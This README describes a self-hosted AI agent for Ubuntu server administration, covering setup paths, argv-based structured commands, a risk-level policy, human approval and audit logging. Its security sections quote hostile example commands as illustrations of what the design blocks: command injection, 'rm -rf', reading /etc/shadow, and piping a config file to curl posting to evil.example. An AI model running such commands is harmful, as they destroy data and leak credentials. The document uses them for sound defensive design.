# AI Server Administration Agent

A self-hosted AI agent for Ubuntu server administration. The LLM reasons about problems; the agent executes **structured argv-based commands** under the Linux permissions of a dedicated `ai` user, with **policy enforcement**, **human approval**, and **audit logging**.

This project is designed so the LLM is **never given unrestricted shell access**.

## Quick start

```bash
python3 -m venv .venv
source .venv/bin/activate   # Windows: .venv\Scripts\activate
pip install -e ".[dev]"

cp .env.example .env
# Path A for the model, plus SUPABASE_URL and SUPABASE_ANON_KEY

ai-agent serve    # model and API, one process
ai-agent login    # once, in the browser
ai-agent          # chat client
```

On an Ubuntu server, use [Path G — Ubuntu production (systemd)](#path-g-ubuntu-production-systemd) (`sudo systemctl enable --now ai-agent`) instead of leaving a terminal open. Details: [`deploy/systemd/README.md`](deploy/systemd/README.md).

**Requirements:**
- Python 3.11+
- an LLM backend (see [Setup guide](#setup-guide))
- a Supabase project with Discord sign-in (same one as the Android app)
- a Linux target user `ai` **without sudo** for command execution.

For the recommended first run, use [Path A — Ollama on this machine](#path-a-ollama-on-this-machine-recommended). Publishing that API on the internet is [Path F](#path-f--public-api-through-cloudflare).

---

## Setup guide

Copy [`.env.example`](.env.example) to `.env`, pick **one path** below, and set only the variables listed for that path. The full variable reference is in [Configuration](#configuration).

### Start here

If you have never run this project, use this table once. You can ignore the other paths until you need them.

| Your goal | Path | What you run |
|-----------|------|----------------|
| Try it on a laptop (Windows, macOS, or Linux) | [A](#path-a-ollama-on-this-machine-recommended) | `ai-agent serve`, then `ai-agent login`, then `ai-agent` |
| Run model and API in **two terminals** (debugging) | [B](#path-b-two-window-workflow-same-machine) | `ai-agent-llm` in one window, `ai-agent-serve` in another |
| **Ubuntu server**, starts at boot, no SSH needed | [G](#path-g-ubuntu-production-systemd) | `sudo deploy/systemd/install.sh`, then `sudo systemctl enable --now ai-agent` |
| HTTPS for CLI + Android (Cloudflare Tunnel) | [F](#path-f--public-api-through-cloudflare) | Path **G** (or A) on the model machine, then cloudflared |
| Model on a GPU box, agent on your laptop | [C](#path-c-remote-ollama-over-ssh) | `ai-agent config remote-provider`, then `ai-agent` |
| vLLM instead of Ollama | [D](#path-d-vllm-linux--wsl2) | Same as A or B, with `LLM_ENGINE=vllm` |
| Ollama/vLLM already running (Docker, systemd, cloud) | [E](#path-e-attach-to-an-already-running-engine) | `LLM_MANAGE_UPSTREAM=false`, then B or `ai-agent serve` |

**One process vs two:** In normal use you want **one** server process. `ai-agent serve` (and the systemd service) starts the inference engine, the local LLM facade, and the loopback API together. Paths B and the old `ai-agent-llm` + `ai-agent-serve` pair exist so you can debug each layer separately.

**Two different “users” on a server:** The **systemd service** runs as the Linux account `ai` (created by the installer). Approved **shell commands** from the agent also run as that same `ai` user when the default `local` execution target is used. That user must not have sudo.

### Prerequisites (every path)

| Requirement | Notes |
|-------------|--------|
| Python 3.11+ | Project runtime |
| `pip install -e ".[dev]"` | Installs **ai-agent only** — not Ollama or vLLM |
| `.env` file | Start from `.env.example` |

**Engine installs are separate:**

| Engine | Install | Typical platform |
|--------|---------|------------------|
| **Ollama** | [ollama.com](https://ollama.com/) | Windows, macOS, Linux — **recommended for local dev** |
| **vLLM** | `pip install vllm` (Linux + NVIDIA CUDA) | Officially **Linux/WSL2**, not native Windows |

When `LLM_MANAGE_UPSTREAM=true` (default), `ai-agent-llm` runs `ollama serve` or `vllm serve` for you. The engine binary or Python package must still be installed on the machine where `ai-agent-llm` runs.

---

### Path A — Ollama on this machine (recommended)

**When:** Local development on Windows, macOS, or Linux. Simplest way to get running.

**1. Install Ollama** from [ollama.com](https://ollama.com/) and pull a model:

```bash
ollama pull qwen3:14b
```

**2. Set these in `.env`:**

| Variable | Example | Purpose |
|----------|---------|---------|
| `LLM_ENGINE` | `ollama` | Server-side engine (for `ai-agent-llm`) |
| `LLM_MODEL` | `qwen3:14b` | Must match a model Ollama has pulled |
| `LLM_UPSTREAM` | `http://localhost:11434` | Where Ollama listens |
| `LLM_HOST` | `http://localhost:11434` | Where **ai-agent** connects (see Path B for facade URL) |
| `LLM_MANAGE_UPSTREAM` | `true` | `ai-agent-llm` starts `ollama serve` if needed |

Optional: `OLLAMA_NUM_CTX=16384` (context window, Ollama only).

**3. Run the server and the client.**

Set `SUPABASE_URL` and `SUPABASE_ANON_KEY` (the publishable key). In the Supabase redirect allow list, add `http://127.0.0.1:53682/callback`.

Recommended — one terminal for model + API (`ai-agent serve` starts Ollama when needed and does not require setting `LLM_HOST`):

```bash
ai-agent serve
ai-agent login
ai-agent
```

Chats are stored in `~/.local/share/ai-agent/conversations.db` for whichever user runs the server process. That file is not served over HTTP.

**Alternatives:** [Path B](#path-b-two-window-workflow-same-machine) (`ai-agent-llm` + `ai-agent-serve`). Or `ai-agent-serve` alone only if the model is already reachable at `LLM_HOST` in `.env` (for example direct Ollama on port 11434).

---

### Path B — Two-window workflow (same machine)

**When:** You want a dedicated model server process (`ai-agent-llm`) and a separate agent CLI, or you want warmup + a stable local URL to paste into `.env`.

**1. Set these in `.env` (before starting):**

| Variable | Example | Purpose |
|----------|---------|---------|
| `LLM_ENGINE` | `ollama` or `vllm` | Engine `ai-agent-llm` uses |
| `LLM_MODEL` | `qwen3:14b` | Model name/id for that engine |
| `LLM_UPSTREAM` | `http://localhost:11434` | Engine bind URL (**not** the facade URL) |
| `LLM_MANAGE_UPSTREAM` | `true` | Start/stop engine with `ai-agent-llm` |
| `LLM_BIND_HOST` | `127.0.0.1` | Facade listen address |
| `LLM_BIND_PORT` | `0` | `0` = OS picks a free port |

Do **not** set `LLM_HOST` yet — Window 1 prints it.

**2. Window 1 — model server:**

```bash
ai-agent-llm
```

Wait for `Endpoint: http://127.0.0.1:…` and copy the printed `LLM_HOST=…` line into `.env`.

**3. Window 2 — API and client:**

`ai-agent-serve` reads `LLM_HOST`. Leave `LLM_UPSTREAM` pointed at the real engine.

```bash
ai-agent-serve
ai-agent login
ai-agent
```

Details: [Two-window workflow](#two-window-workflow-details) · Architecture: [`ai_agent/llm/ARCHITECTURE.md`](ai_agent/llm/ARCHITECTURE.md)

---

### Path C — Remote Ollama over SSH

**When:** Ollama runs on a GPU box; the agent runs on your laptop. Ollama stays on `127.0.0.1:11434` on the remote machine — no LAN exposure.

**1. On the GPU machine:** install Ollama and this repo; run host setup when the wizard tells you to.

**2. On the agent machine:** run the wizard (writes `.env` for you):

```bash
ai-agent config remote-provider
ai-agent config remote-provider test
```

**Variables the wizard sets (or set manually):**

| Variable | Purpose |
|----------|---------|
| `LLM_TRANSPORT` | `ssh` |
| `LLM_ENGINE` | `ollama` (SSH path is Ollama-only today) |
| `LLM_SSH_HOST` | Host alias in `.ai-agent/ssh/config` |
| `LLM_SSH_CONFIG` | Path to sandbox SSH config |
| `LLM_SSH_REMOTE` | Ollama on GPU box (default `127.0.0.1:11434`) |
| `LLM_HOST` | Local tunnel URL (wizard default `http://127.0.0.1:11434`) |
| `LLM_MODEL` | Model pulled on the GPU box |
| `LLM_MANAGE_UPSTREAM` | `false` — engine runs on remote host, not started locally |

**3. Start the agent:**

```bash
ai-agent
```

Full walkthrough: [SSH remote provider](#ssh-remote-provider).

---

### Path D — vLLM (Linux / WSL2)

**When:** You need vLLM for fine-tuning throughput or specific Hugging Face models.

**Platform notes:**

- **Linux + NVIDIA GPU:** supported — `pip install vllm`
- **Windows (native):** vLLM is **not** officially supported; use [Path A (Ollama)](#path-a-ollama-on-this-machine-recommended), [WSL2](https://docs.vllm.ai/en/latest/getting_started/installation/gpu/), or set `LLM_MANAGE_UPSTREAM=false` and point at a remote vLLM server
- **`pip install -e ".[dev]"` does not install vLLM** — install it separately in the same venv or WSL environment

**Set these in `.env`:**

| Variable | Example | Purpose |
|----------|---------|---------|
| `LLM_ENGINE` | `vllm` | Use vLLM engine |
| `LLM_MODEL` | `meta-llama/Llama-3.1-8B-Instruct` | Model id vLLM serves |
| `LLM_UPSTREAM` | `http://localhost:8000` | vLLM bind URL (default port 8000) |
| `LLM_MANAGE_UPSTREAM` | `true` | `ai-agent-llm` runs `vllm serve …` |
| `LLM_STARTUP_TIMEOUT` | `180` | Model load can take minutes |
| `VLLM_MAX_TOKENS` | optional | Cap reply length |

Optional: `LLM_VLLM_BINARY=/path/to/vllm` if the CLI is not on `PATH`.

Then use [Path B](#path-b-two-window-workflow-same-machine) (`ai-agent-llm` + `ai-agent`).

If vLLM is already running elsewhere:

```env
LLM_MANAGE_UPSTREAM=false
LLM_UPSTREAM=http://your-vllm-host:8000
```

---

### Path E — Attach to an already-running engine

**When:** You start Ollama or vLLM yourself (systemd, Docker, cloud VM) and only want the facade + agent.

| Variable | Value |
|----------|--------|
| `LLM_MANAGE_UPSTREAM` | `false` |
| `LLM_UPSTREAM` | URL where the engine already listens |
| `LLM_ENGINE` | `ollama` or `vllm` — must match what's running |
| `LLM_MODEL` | Model available on that engine |

Run `ai-agent-llm` (facade + warmup) or point `LLM_HOST` directly at the engine if you skip the facade.

---

### Path G — Ubuntu production (systemd)

**When:** An Ubuntu Server (24.04 or similar) should run the model and API as one service, survive reboot, and start without you SSH in. Use [Path F](#path-f--public-api-through-cloudflare) afterward if you want HTTPS through Cloudflare.

**What you get:** One unit, `ai-agent.service`, running `ai-agent serve` as the `ai` user. It starts Ollama or vLLM (unless something already listens at `LLM_UPSTREAM`), warms the model, binds the LLM facade on loopback, and serves the API on `127.0.0.1`:`API_BIND_PORT`. Logs go to the journal.

**1. Install dependencies on the server**

```bash
sudo apt update
sudo apt install -y python3-venv python3-pip acl
```

Install **Ollama** ([ollama.com](https://ollama.com/)) or **vLLM** on the same machine. The Python package does not install them.

```bash
ollama pull qwen3:14b   # example; match LLM_MODEL in .env
```

If you use vLLM and it binds port `8000`, set a different `API_BIND_PORT` in `.env` (see step 2).

**2. Install the project**

```bash
git clone <your-repo-url> AI-agent   # or use your existing checkout
cd AI-agent
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
cp .env.example .env
```

Edit `.env`. For a typical Ollama server you need at least:

| Variable | Example | Notes |
|----------|---------|--------|
| `LLM_ENGINE` | `ollama` | |
| `LLM_MODEL` | `qwen3:14b` | Must exist on the engine (`ollama pull …`) |
| `LLM_UPSTREAM` | `http://localhost:11434` | Engine URL, **not** the facade |
| `LLM_MANAGE_UPSTREAM` | `true` | Service starts `ollama serve` if needed |
| `API_BIND_HOST` | `127.0.0.1` | Do not expose the API on `0.0.0.0` |
| `API_BIND_PORT` | `8000` | Cloudflare Tunnel targets this port |
| `SUPABASE_URL` | `https://….supabase.co` | Required for authenticated API routes |
| `SUPABASE_ANON_KEY` | publishable key | Not the service-role key |

You do **not** need to set `LLM_HOST` for `ai-agent serve` — the process picks a facade port and uses it internally. Status will show something like `Model: http://127.0.0.1:33841` in `systemctl status`; that is expected.

**3. Install and enable the systemd unit**

From the repo root:

```bash
sudo deploy/systemd/install.sh
sudo systemctl daemon-reload
sudo systemctl enable --now ai-agent
```

The installer writes `/etc/systemd/system/ai-agent.service`, creates the `ai` user if missing, and creates `/tmp/ai-agent`. It does **not** start the service until you run `enable --now` or `start`.

Re-run `sudo deploy/systemd/install.sh` after you move the checkout, recreate `.venv`, or pull unit template changes, then `sudo systemctl daemon-reload`.

**4. Verify**

```bash
sudo systemctl status ai-agent
curl -s http://127.0.0.1:8000/health
sudo journalctl -u ai-agent -b -n 50 --no-pager
```

`active (running)` with status `Listening on http://127.0.0.1:8000` and `{"status":"ok"}` from `/health` mean the stack is up. The first start can take minutes while the model loads; the unit stays `activating (start)` until the API socket is open.

Conversation SQLite for the service lives under **`/var/lib/ai-agent/.local/share/ai-agent/`** (the `ai` user’s home), not your login user’s home.

**5. Optional CLI shortcuts**

When the unit is installed:

```bash
ai-agent status    # same as systemctl status (no sudo if your user can manage the unit)
ai-agent start     # delegates to systemctl; use sudo if you get “Permission denied”
```

**Common install and startup problems**

| Symptom | Cause | Fix |
|---------|--------|-----|
| Installer: `ai cannot execute …/.venv/bin/ai-agent` | Checkout under `~/…` and home dir is `750` (`drwxr-x---`) | `sudo apt install acl`, re-run `sudo deploy/systemd/install.sh` (applies traverse ACLs), or `sudo setfacl -m u:ai:--x /home/YOUR_USER` |
| `bad-setting` / `WorkingDirectory= path is not absolute` | Old generated unit file | Pull latest repo, `sudo deploy/systemd/install.sh`, `sudo systemctl daemon-reload` |
| Service starts but ignores `.env` | `ai` cannot read `.env` | Installer tries `chgrp ai` + `640`; or `sudo chgrp ai .env && sudo chmod 640 .env` |
| `activating (start)` a long time | Model warmup | Normal; `sudo journalctl -u ai-agent -f` |
| Start fails after ~900s | Model too slow to load | Increase `LLM_STARTUP_TIMEOUT` in `.env` and `TimeoutStartSec` in the unit template, reinstall unit |
| `ollama` / `vllm` not found in journal | Engine not on `PATH` for `ai` | Install Ollama system-wide or set `LLM_OLLAMA_BINARY` / `LLM_VLLM_BINARY` in `.env` |
| GPU errors | `ai` not in device groups | `sudo usermod -aG render,video ai`, restart service |
| API bind error / port in use | vLLM and API both want 8000 | Change `API_BIND_PORT` and tunnel config |

Full service reference: [`deploy/systemd/README.md`](deploy/systemd/README.md).

---

### Path F — Public API through Cloudflare

**When:** You want the CLI and the Android app to share one HTTPS address. The API, the agent, and the chat database run on the model machine.

**Where:** On the machine that hosts the model. The API listens on `127.0.0.1` only (`ai-agent serve` or `ai-agent-serve`). Cloudflare Tunnel is what the internet connects to.

**Prerequisite:** The model machine already runs the API. On Ubuntu production that means [Path G](#path-g-ubuntu-production-systemd) (`systemctl status ai-agent` shows `active (running)`). On a laptop use [Path A](#path-a-ollama-on-this-machine-recommended) (`ai-agent serve`).

**1. Install the Python package** (repo root, venv active):

```bash
pip install -e ".[dev]"
```

That installs FastAPI and Uvicorn with the rest of the project. It does not install cloudflared, Ollama, or vLLM.

**2. Supabase.** Use the same project as the Android app. Discord setup is in [`clients/android/README.md`](clients/android/README.md). Copy the project URL and the **publishable** (anon) key. Do not put the service-role key in `.env`.

**3. Install cloudflared** from [Cloudflare's download page](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/).

**4. Set these in `.env`:**

| Variable | Example | Purpose |
|----------|---------|---------|
| `SUPABASE_URL` | `https://YOUR_PROJECT.supabase.co` | Project URL. Signing keys are fetched from here. |
| `SUPABASE_ANON_KEY` | publishable key | Same key as Android `local.properties`. |
| `API_BIND_HOST` | `127.0.0.1` | Must stay a loopback address. |
| `API_BIND_PORT` | `8000` | Local port the tunnel targets. |
| `API_BASE_URL` | `http://127.0.0.1:8000` | Where the CLI sends chats. Use the HTTPS hostname from another machine. |
| `CONVERSATION_DATABASE` | empty | SQLite file on this machine. Set a SQLAlchemy URL to put chats somewhere else later. |

If vLLM is already using port 8000, pick another `API_BIND_PORT` and use that port in the tunnel config.

**5. Start the API** (skip if Path G already enabled the service).

On an Ubuntu server, use [Path G](#path-g-ubuntu-production-systemd) — do not run a second copy in a terminal:

```bash
sudo systemctl enable --now ai-agent
curl -s http://127.0.0.1:8000/health
```

For a one-off terminal on a dev machine:

```bash
ai-agent serve
```

To run **only** the API while the model is already up and `LLM_HOST` is set in `.env`:

```bash
ai-agent-serve
```

```bash
curl -s http://127.0.0.1:8000/health
```

The first start creates the conversation SQLite file and applies the Alembic migration (under the **user that runs the server** — `/var/lib/ai-agent/…` for systemd, or your home when you run `ai-agent serve` locally). Nothing in the API serves that file over HTTP.

`{"status":"ok"}` means the process is up. `/api/me` without a token is rejected.

**CLI sign-in.** Add `http://127.0.0.1:53682/callback` to the Supabase redirect allow list (next to the Android `aiagent://login-callback` URL), then:

```bash
ai-agent login
ai-agent
```

`/new` starts a chat, `/list` shows chats. A command that needs approval pauses the stream; answer `y`, `n`, or `a` in the terminal. The Android app can open the same chats after you set `API_BASE_URL`.

**6. Open the tunnel** from the same machine:

```bash
cloudflared tunnel login
cloudflared tunnel create ai-agent
```

Copy [`deploy/cloudflared/config.yml.example`](deploy/cloudflared/config.yml.example) to `deploy/cloudflared/config.yml`. Fill in the tunnel id, the credentials file path from the create command, and your hostname. If you changed `API_BIND_PORT`, change the origin port too.

```bash
cloudflared tunnel route dns ai-agent agent.example.com
cloudflared tunnel --config deploy/cloudflared/config.yml run
```

Leave the API and cloudflared running. With the systemd unit, the API is `ai-agent.service` and cloudflared is still its own process. `https://agent.example.com/health` should return the same JSON.

Leave `SUPABASE_JWT_SECRET` empty. Set it only if this Supabase project still signs tokens with the legacy shared secret (HS256).

---

## Architecture

```text
CLI or Android
    |  Supabase access token
    v
systemd: ai-agent.service
    |
    v
ai-agent serve (one process; loopback API; Cloudflare Tunnel for HTTPS)
    |-- SQLite chats, on this machine only
    |-- Agent loop, policy, audit
    |-- LLM facade --> Ollama or vLLM
    +-- Execution targets (local / SSH / Docker)
```

`ai-agent serve` runs the agent loop on the model machine. The API calls the in-process LLM facade, and commands run through execution targets in that same process. `ai-agent-serve` is the API on its own and calls `LLM_HOST`. The CLI and Android app send a Supabase access token and do not run the loop themselves. Chats are rows in the local SQLite file, keyed by the token subject. Production setup: [`deploy/systemd/README.md`](deploy/systemd/README.md).

### Responsibilities stay separate

| Layer | Role |
|-------|------|
| LLM | Reasoning and proposing structured commands. Talked to only through `LLMProvider`. |
| Agent | Policy, approval, execution, logging |
| Linux | Final permission boundary |
| Human | Approves consequential operations |

**The model must not approve its own actions.** The signed-in client sends the approval. It is not inferred from chat text.

---

## Command model: argv + structured chaining

The LLM proposes **CommandExpr** JSON, not shell strings.

Supported expression types:

| Type | Meaning | Example rendered form |
|------|---------|------------------------|
| `single` | One argv array | `df -h` |
| `pipe` | Left expression piped to right argv | `journalctl ... \| grep error` |
| `and` | Run right only if left exits 0 | `systemctl is-active nginx && systemctl restart nginx` |
| `or` | Run right only if left exits non-zero | `test -f /tmp/x \|\| echo missing` |
| `redirect` | Limited stdout/stderr redirect | `df -h > /tmp/ai-agent/out.txt` |

Every leaf command is an **argv array**:

```json
{"type": "single", "argv": ["docker", "ps"]}
```

Pipelines:

```json
{
  "type": "pipe",
  "left": {
    "type": "single",
    "argv": ["journalctl", "-u", "nginx", "-n", "100", "--no-pager"]
  },
  "right": ["grep", "-i", "error"]
}
```

### Why not raw shell strings?

**Do not pass model output to `/bin/sh -c`.** Allow-lists on shell strings are bypassable:

```bash
cat /etc/passwd; rm -rf /important
cat file$(curl attacker)
cat /safe/path | sh
grep pattern /etc/shadow
```

Even when the user approves what they see, metacharacters and chained semantics hide intent.

Instead:

1. The model emits structured JSON (`CommandExpr`)
2. The policy engine validates **each segment**
3. The executor runs argv arrays directly (`subprocess` with list args — **no shell**)
4. The CLI renders a human-readable command for approval

This gives a shell-like UX without shell parsing.

---

## Security model

### Risk levels

| Level | Behavior |
|-------|----------|
| `READ_ONLY` | May auto-run in balanced mode (`df`, `docker ps`, `journalctl`, etc.) |
| `REVERSIBLE` | Requires confirmation (`systemctl restart`, `docker restart`) |
| `DESTRUCTIVE` | Requires explicit confirmation (`docker rm`, `systemctl disable`) |
| `FORBIDDEN` | Hard reject — never executed (`docker run`, `rm -rf /`, shell binaries) |

Effective risk for chained expressions is the **maximum** risk of all segments.

Policy is enforced in **`ai_agent/policy/default_policy.yaml`**. The LLM cannot override it.

### Linux user boundary

Run the agent as user `ai`:

- No sudo
- No automatic sudoers modification
- If a command fails with `Permission denied`, the agent reports that honestly

**Important:** Adding `ai` to the `docker` group grants significant privilege (Docker socket ≈ root). Document and accept this consciously on home servers.

### Filesystem policy

Path arguments (`cat`, `grep`, `ls`, etc.) must fall under configured readable roots (see policy YAML).

Redirects (`>`, `>>`, `2>`) are only allowed into configured writable directories (default: `/tmp/ai-agent`).

Always canonicalize paths and reject traversal outside allowed roots.

### Network tools (localhost health checks only)

Network commands are a **separate trust boundary** from filesystem read access.

Even read-only disk access does not prevent exfiltration:

```bash
cat /home/user/.config/app/config | curl -X POST -d @- https://evil.example/leak
```

v1 policy for `curl` / `wget`:

- **Allowed:** `GET` / `HEAD` to `127.0.0.1`, `localhost`, `::1`
- **Forbidden:** upload flags (`-d`, `--data`, `-T`, …)
- **Forbidden:** piping stdin into `curl` / `wget`
- **Forbidden:** arbitrary remote hosts

This supports local health checks (`curl http://127.0.0.1:8080/health`) without opening general outbound network access.

### Environment hardening

The executor passes a **minimal environment** (`PATH`, `LANG`, `HOME`, etc.) to subprocesses to reduce injection via `LD_PRELOAD` and similar variables.

---

## Confirmation UX

Three modes via `AGENT_CONFIRMATION_MODE`:

| Mode | Behavior |
|------|----------|
| `paranoid` | Confirm every command, including READ_ONLY |
| `balanced` | Auto-run READ_ONLY; confirm REVERSIBLE+ (**default**) |
| `permissive` | Auto-run up to REVERSIBLE; confirm DESTRUCTIVE+ |

### Single-command approval

For REVERSIBLE+ commands, the CLI shows:

```text
AI wants to execute:
  systemctl restart nginx
  Risk: REVERSIBLE
  Reason: nginx appears unhealthy
  Segments:
    1. systemctl restart nginx  [REVERSIBLE]

Approve? (y/n/a)
```

### Batch preview (READ_ONLY inspections)

When the model proposes multiple READ_ONLY checks, the CLI can show one prompt:

```text
AI wants to run these READ_ONLY checks:
  1. df -h  [READ_ONLY]
  2. docker ps  [READ_ONLY]
  3. journalctl -u nginx -n 100 --no-pager | grep -i error  [READ_ONLY]

Proceed with batch? (y/n/a)
```

This reduces prompt fatigue while keeping mutations gated.

### Session grants

Optional responses like `a` / `allow` create **session-scoped grants** (e.g. skip READ_ONLY prompts for the rest of the session). Grants are stored in the CLI session state — **not** in LLM context where the model could forge them.

---

## Audit logging

Every tool invocation logs structured JSON lines:

- timestamp, session ID, user
- tool name, arguments, rendered command
- risk level, confirmation required/granted
- exit status, duration, errors
- stdout/stderr preview (truncated)

Configure with `AGENT_AUDIT_LOG=/var/log/ai-agent/audit.jsonl`.

Secrets are redacted from keys matching `password`, `token`, `secret`, etc.

---

## Configuration

See [`.env.example`](.env.example). Scenario-specific checklists are in the [Setup guide](#setup-guide).

### LLM — agent client (`ai-agent`)

Set these when running the agent. For remote inference, see [Path C](#path-c-remote-ollama-over-ssh).

| Variable | Description |
|----------|-------------|
| `LLM_HOST` | URL the agent calls (facade from `ai-agent-llm`, direct Ollama/vLLM, or local end of SSH tunnel) |
| `LLM_MODEL` | Model name/id — must exist on the configured engine |
| `LLM_TRANSPORT` | `http` (default) or `ssh` (Ollama over SSH tunnel) |
| `LLM_SSH_HOST` | Host alias in `.ai-agent/ssh/config` (when `LLM_TRANSPORT=ssh`) |
| `LLM_SSH_CONFIG` | Path to sandbox SSH config (default `.ai-agent/ssh/config`) |
| `LLM_SSH_REMOTE` | Ollama bind on the GPU box (default `127.0.0.1:11434`) |
| `LLM_TIMEOUT` | HTTP read timeout for streaming generations (seconds) |

### LLM — model server (`ai-agent-llm`)

Set these when running `ai-agent-llm`. See [Path B](#path-b-two-window-workflow-same-machine) and [Path E](#path-e-attach-to-an-already-running-engine).

| Variable | Description |
|----------|-------------|
| `LLM_ENGINE` | Server-side engine: `ollama` or `vllm` |
| `LLM_UPSTREAM` | Engine bind URL (**not** the facade URL — do not point this at `LLM_HOST`) |
| `LLM_MANAGE_UPSTREAM` | When `true` (default), start/stop the engine process with the facade |
| `LLM_STARTUP_TIMEOUT` | Seconds to wait for the engine to accept HTTP (default `180`) |
| `LLM_BIND_HOST` | Address the facade listens on (default `127.0.0.1`) |
| `LLM_BIND_PORT` | Facade port (`0` = pick a free port and print it) |
| `LLM_OLLAMA_BINARY` | Optional path to `ollama` if not on `PATH` |
| `LLM_VLLM_BINARY` | Optional path to `vllm` if not on `PATH` |

### Public API (`ai-agent-serve`)

See [Path F](#path-f--public-api-through-cloudflare). This process calls `LLM_HOST` for the model. Clients call `API_BASE_URL`.

| Variable | Description |
|----------|-------------|
| `API_BIND_HOST` | Loopback listen address (default `127.0.0.1`). `0.0.0.0` is refused. |
| `API_BIND_PORT` | Listen port (default `8000`) |
| `SUPABASE_URL` | Supabase project URL for JWT signing keys |
| `SUPABASE_ANON_KEY` | Publishable key sent when fetching those keys |
| `SUPABASE_JWT_AUDIENCE` | Expected `aud` claim (default `authenticated`) |
| `SUPABASE_JWT_SECRET` | Legacy HS256 secret. Leave empty for current projects. |
| `API_BASE_URL` | URL the CLI calls (default `http://127.0.0.1:8000`) |
| `CLI_OAUTH_PORT` | Loopback port for `ai-agent login` (default `53682`) |
| `CONVERSATION_DATABASE` | SQLAlchemy URL. Empty uses the local SQLite file. |
| `AGENT_APPROVAL_TIMEOUT` | Seconds a turn waits for approval (default `900`) |

### LLM — engine-specific options

| Variable | Engine | Description |
|----------|--------|-------------|
| `OLLAMA_NUM_CTX` | Ollama | Context window (default `16384`) |
| `OLLAMA_NUM_PREDICT` | Ollama | Optional reply token cap |
| `VLLM_MAX_TOKENS` | vLLM | Optional reply token cap |

### Agent behavior

| Variable | Description |
|----------|-------------|
| `AGENT_MAX_CONTINUATIONS` | How many times one answer may resume after being cut off |
| `AGENT_CONTINUATION_TAIL` | Characters of the partial answer resent when resuming |
| `AGENT_LOG_LEVEL` | Logging level |
| `AGENT_STREAM_RESPONSES` | Stream assistant text to the terminal as it is generated (`true` / `false`) |
| `AGENT_MAX_ITERATIONS` | Max tool-call loop iterations |
| `AGENT_TOOL_TIMEOUT` | Per-command timeout (seconds) |
| `AGENT_CONFIRMATION_MODE` | `paranoid` / `balanced` / `permissive` |
| `AGENT_OUTPUT_LIMIT` | Max stdout/stderr returned to model |
| `AGENT_AUDIT_LOG` | Audit log file path |
| `AGENT_POLICY_FILE` | Override policy YAML path |
| `AGENT_SCRATCH_DIR` | Writable scratch dir for redirects |

### Command execution (independent of LLM)

| Variable | Description |
|----------|-------------|
| `AGENT_EXECUTION_TARGETS_FILE` | YAML of named command-execution targets (default `execution_targets.yaml`) |
| `AGENT_DEFAULT_TARGET` | Target used when the model omits `target` (default `local`) |

### Full reference (all variables)

| Variable | Description |
|----------|-------------|
| `LLM_HOST` | URL the **agent** uses (facade, direct server, or local end of SSH tunnel) |
| `LLM_MODEL` | Model name/id for the configured `LLM_ENGINE` |
| `LLM_ENGINE` | Server-side engine for **`ai-agent-llm`**: `ollama` or `vllm` |
| `LLM_UPSTREAM` | Engine bind URL for **`ai-agent-llm`** (not the facade URL) |
| `LLM_MANAGE_UPSTREAM` | When `true` (default), **`ai-agent-llm`** starts/stops the engine process |
| `LLM_STARTUP_TIMEOUT` | Seconds to wait for the engine to accept HTTP (default `180`) |
| `LLM_TRANSPORT` | `http` (default) or `ssh` (Ollama engine only) |
| `LLM_SSH_HOST` | Host alias in the sandboxed SSH config |
| `LLM_SSH_CONFIG` | Path to `.ai-agent/ssh/config` |
| `LLM_SSH_REMOTE` | Engine bind on the GPU box (default `127.0.0.1:11434`) |
| `LLM_BIND_HOST` | Address the facade listens on (default `127.0.0.1`) |
| `LLM_BIND_PORT` | Facade port (`0` = pick a free port and print it) |
| `LLM_TIMEOUT` | HTTP read timeout for streaming generations (seconds) |
| `LLM_OLLAMA_BINARY` | Optional `ollama` binary path |
| `LLM_VLLM_BINARY` | Optional `vllm` binary path |
| `OLLAMA_NUM_CTX` | Context window (Ollama engine only) |
| `OLLAMA_NUM_PREDICT` | Optional reply token cap (Ollama engine only) |
| `VLLM_MAX_TOKENS` | Optional reply token cap (vLLM engine only) |
| `AGENT_MAX_CONTINUATIONS` | How many times one answer may resume after being cut off |
| `AGENT_CONTINUATION_TAIL` | Characters of the partial answer resent when resuming |
| `AGENT_LOG_LEVEL` | Logging level |
| `AGENT_STREAM_RESPONSES` | Stream assistant text to the terminal as it is generated (`true` / `false`) |
| `AGENT_MAX_ITERATIONS` | Max tool-call loop iterations |
| `AGENT_TOOL_TIMEOUT` | Per-command timeout (seconds) |
| `AGENT_CONFIRMATION_MODE` | `paranoid` / `balanced` / `permissive` |
| `AGENT_OUTPUT_LIMIT` | Max stdout/stderr returned to model |
| `AGENT_AUDIT_LOG` | Audit log file path |
| `AGENT_POLICY_FILE` | Override policy YAML path |
| `AGENT_SCRATCH_DIR` | Writable scratch dir for redirects |
| `AGENT_EXECUTION_TARGETS_FILE` | YAML of named command-execution targets (default `execution_targets.yaml`) |
| `AGENT_DEFAULT_TARGET` | Target used when the model omits `target` (default `local`) |
| `API_BIND_HOST` | Loopback address for `ai-agent-serve` (default `127.0.0.1`) |
| `API_BIND_PORT` | Port for `ai-agent-serve` (default `8000`) |
| `SUPABASE_URL` | Supabase project URL used to verify access tokens |
| `SUPABASE_ANON_KEY` | Publishable Supabase key (not the service-role key) |
| `SUPABASE_JWT_AUDIENCE` | Expected token audience (default `authenticated`) |
| `SUPABASE_JWT_SECRET` | Legacy HS256 secret; empty when the project uses signing keys |
| `API_BASE_URL` | URL the CLI calls (default `http://127.0.0.1:8000`) |
| `CLI_OAUTH_PORT` | Loopback port for Discord sign-in (default `53682`) |
| `CONVERSATION_DATABASE` | SQLAlchemy URL for chats. Empty uses the on-machine SQLite file. |
| `AGENT_APPROVAL_TIMEOUT` | Seconds to wait for a command approval (default `900`) |

---

## LLM host (local or remote)

For **getting started**, use the [Setup guide](#setup-guide) paths instead of reading this section first.

Inference is split into **client** and **server** packages (see [`ai_agent/llm/ARCHITECTURE.md`](ai_agent/llm/ARCHITECTURE.md)):

| Package | Process | Role |
|---------|---------|------|
| `ai_agent.llm.client` | `ai-agent` | `FacadeLlmClient` — one provider, canonical HTTP API |
| `ai_agent.llm.server` | `ai-agent-llm` | `AgentLlmFacade` + `LlmEngine` (`OllamaEngine` or `VLLMEngine`) |
| `ai_agent.llm.http` | both | Shared HTTP transport only |

`ai-agent-serve` connects to whatever URL is in `LLM_HOST`. Engine choice is `LLM_ENGINE` on `ai-agent-llm`. The `ai-agent` command is the chat client: it uses `API_BASE_URL` and a Supabase access token. `ai-agent serve` starts the engine and the API together and points the API at the facade it just bound.

| Piece | Role |
|-------|------|
